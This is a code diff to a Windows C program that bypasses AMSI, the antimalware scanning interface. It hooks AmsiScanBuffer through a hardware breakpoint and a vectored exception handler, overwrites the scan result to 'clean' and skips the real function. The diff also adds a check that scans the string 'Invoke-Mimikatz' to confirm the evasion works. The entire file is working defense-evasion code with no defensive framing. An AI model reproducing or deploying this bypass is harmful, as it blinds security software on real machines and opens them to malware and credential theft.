@@ -1,16 +1,17 @@
 #include <windows.h>
 #include <stdio.h>
+#include <amsi.h>
 
 #pragma warning(disable: 4334)
 
-typedef enum AMSI_RESULT
-{
-    AMSI_RESULT_CLEAN = 0,
-    AMSI_RESULT_NOT_DETECTED = 1,
-    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
-    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4fff,
-    AMSI_RESULT_DETECTED = 32768
-} 	AMSI_RESULT;
+// typedef enum AMSI_RESULT
+// {
+//     AMSI_RESULT_CLEAN = 0,
+//     AMSI_RESULT_NOT_DETECTED = 1,
+//     AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
+//     AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4fff,
+//     AMSI_RESULT_DETECTED = 32768
+// } 	AMSI_RESULT;
 
 typedef HRESULT( WINAPI* fnAmsiScanBuffer )(
     CONTEXT      amsiContext,
@@ -20,7 +21,7 @@ typedef HRESULT( WINAPI* fnAmsiScanBuffer )(
     PVOID        amsiSession,
     AMSI_RESULT* result
     );
-fnAmsiScanBuffer AmsiScanBuffer;
+fnAmsiScanBuffer pAmsiScanBuffer;
 
 
 BOOL SetHwBp( HANDLE hThread, PVOID pAddress, DWORD regIndex ) {
@@ -82,7 +83,7 @@ LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {
 
     if ( pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
 
-        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == ( PVOID )AmsiScanBuffer ) {
+        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == ( PVOID )pAmsiScanBuffer ) {
 
             /* x64 calling convention at function entry:
                [RSP+0x00] = Return address (8 bytes)
@@ -93,17 +94,17 @@ LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {
                [RSP+0x28] = 5th parameter: amsiSession (8 bytes)
                [RSP+0x30] = 6th parameter: AMSI_RESULT* (8 bytes) */
 
-            PVOID retAddr = *( PVOID* )pExceptionInfo->ContextRecord->Rsp;
 
-            pExceptionInfo->ContextRecord->Rip = ( UINT_PTR )retAddr;
-            pExceptionInfo->ContextRecord->Rsp += sizeof( PVOID );
+            AMSI_RESULT* pResult = *( AMSI_RESULT** )( pExceptionInfo->ContextRecord->Rsp + 0x30 );
+            if ( pResult && *pResult )
+                *pResult = AMSI_RESULT_CLEAN;
+
+            pExceptionInfo->ContextRecord->Rip = *( DWORD64* )pExceptionInfo->ContextRecord->Rsp; // Set RIP to return address
+            pExceptionInfo->ContextRecord->Rsp += 8;
             pExceptionInfo->ContextRecord->Rax = S_OK;
 
             pExceptionInfo->ContextRecord->Dr6 &= ~0xF;
             pExceptionInfo->ContextRecord->EFlags |= 0x10000;
-
-            AMSI_RESULT* pResult = *( AMSI_RESULT** )( pExceptionInfo->ContextRecord->Rsp + 0x30 );
-            *pResult = AMSI_RESULT_CLEAN;
 
             return EXCEPTION_CONTINUE_EXECUTION;
 
@@ -115,6 +116,28 @@ LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
+BOOL CheckAMSI( void ) {
+
+    HAMSICONTEXT ctx;
+    if ( AmsiInitialize( L"AMSI Text", &ctx ) != S_OK ) {
+        printf( "[-] Failed to initialize AMSI context\n" );
+        return FALSE;
+    }
+
+    LPCWSTR testString = L"Invoke-Mimikatz";
+    AMSI_RESULT result;
+    HRESULT hr = AmsiScanString( ctx, testString, L"AMSI Test", NULL, &result );
+    AmsiUninitialize( ctx );
+
+    if ( hr != S_OK ) {
+        printf( "[-] AmsiScanString failed: 0x%08X\n", hr );
+        return FALSE;
+    }
+
+    printf( "[+] AmsiScanString result: 0x%08X\n", result );
+    return result >= AMSI_RESULT_CLEAN;
+}
+
 int main() {
 
     HMODULE hAmsi = LoadLibraryA( "amsi.dll" );
@@ -123,20 +146,22 @@ int main() {
         return 1;
     }
 
-    AmsiScanBuffer = ( fnAmsiScanBuffer )GetProcAddress( hAmsi, "AmsiScanBuffer" );
+    pAmsiScanBuffer = ( fnAmsiScanBuffer )GetProcAddress( hAmsi, "AmsiScanBuffer" );
 
 
-    printf( "[+] AmsiScanBuffer address: %p\n", AmsiScanBuffer );
+    printf( "[+] AmsiScanBuffer address: %p\n", pAmsiScanBuffer );
 
     AddVectoredExceptionHandler( 1, VectoredExceptionHandler );
 
-    SetHwBp( GetCurrentThread(), ( PVOID )AmsiScanBuffer, 0 );
+    SetHwBp( GetCurrentThread(), ( PVOID )pAmsiScanBuffer, 0 );
 
-    printf( "[+] Breakpoint set at 0x%p\n", AmsiScanBuffer );
+    printf( "[+] Breakpoint set at 0x%p\n", pAmsiScanBuffer );
 
     // NtTraceEvent( NULL, 0, 0, NULL );
 
     system( "pause" );
+
+    CheckAMSI();
 
     RemoveHwBp( GetCurrentThread(), 0 );
 
